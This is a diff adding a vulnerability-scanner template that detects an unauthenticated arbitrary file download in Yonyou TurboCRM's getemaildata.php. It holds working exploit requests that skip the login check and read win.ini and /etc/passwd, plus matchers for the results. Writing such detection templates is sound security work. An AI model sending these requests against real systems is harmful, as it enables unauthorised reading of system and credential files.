@@ -1,0 +1,30 @@
+id: yonyou-turbocrm-getemaildata-fileread
+
+info:
+  name: 用友TurboCRM getemaildata.php 路径存在任意文件下载漏洞
+  author: SleepingBag945
+  severity: high
+  description: |
+    用友TurboCRM /getemaildata.php 路径存在任意文件下载漏洞
+  metadata:
+  tags: 用友-TurboCRM
+
+http:
+  - raw:
+      - |
+        GET /ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /ajax/getemaildata.php?DontCheckLogin=1&filePath=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    match-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && contains(body_1,"for 16-bit app support")
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
